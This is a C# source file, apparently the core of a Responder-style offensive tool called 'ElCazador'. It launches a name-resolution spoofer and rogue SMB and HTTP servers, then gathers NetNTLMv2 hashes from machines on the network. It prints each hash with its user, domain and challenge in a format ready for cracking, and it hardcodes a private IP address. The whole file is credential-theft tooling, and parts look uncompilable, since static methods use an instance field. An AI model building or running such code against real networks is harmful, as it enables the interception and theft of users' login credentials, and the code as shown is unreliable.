using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ElCazador.Worker.Modules.Servers;
using ElCazador.Worker.Modules.Spoofers;
using System.Drawing;
using ElCazador.Worker.Models;
using System.Collections.Concurrent;

namespace ElCazador.Worker
{
    public class Worker
    {
        internal static IPAddress IP { get; set; } = IPAddress.Parse("10.64.13.79"); //Networking.GetLocalIPAddress();
        // internal static IPAddress IP { get; set; } = IPAddress.Parse("192.168.0.2"); //Networking.GetLocalIPAddress();
        private Thread SpooferWork { get; set; }
        private Thread SMBServerWork { get; set; }
        private Thread HTTPServerWork { get; set; }
        private IDictionary<string, Hash> Hashes { get; set; } = new ConcurrentDictionary<string, Hash>();

        private IWorkerController Controller;

        public Worker(IWorkerController controller)
        {
            Controller = controller;

            var spoofer = new SpooferCore(new SpooferSettings { });
            var smbServer = new SMBServer();
            var httpServer = new HTTPServer(80);

            SpooferWork = new Thread(spoofer.Run);
            HTTPServerWork = new Thread(httpServer.Run);
            SMBServerWork = new Thread(smbServer.Run);

            SpooferWork.Start();
            HTTPServerWork.Start();
            SMBServerWork.Start();
        }

        public static void WriteLine(string value, params object[] args)
        {
            Console.WriteLine(value, args);
        }

        public static void Write(string value, params object[] args)
        {
            Console.Write(value, args);
        }

        public static void AddHash(Hash hash)
        {
            // To avoid empty shit
            if (hash.Key.Equals("\\"))
            {
                return;
            }

            if (Hashes.ContainsKey(hash.Key))
            {
                Program.Write("{2}Already collected hash from {0}\\{1}", hash.Domain, hash.User, Environment.NewLine);
            }
            else
            {
                Hashes.Add(hash.Key, hash);

                WriteHash(hash);
            }
        }

        private static void WriteHash(Hash hash)
        {
            Program.Write(
                    @"{0}Received NetNTLMv2 hash from {1}{0}{2}::{3}:{4}:{5}:{6}",
                    Environment.NewLine,
                    hash.IPAddress.ToString(),
                    hash.User,
                    hash.Domain,
                    hash.Challenge,
                    String.Concat(hash.NetLMHash),
                    string.Concat(hash.NetNTHash)
                );
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
    }
}
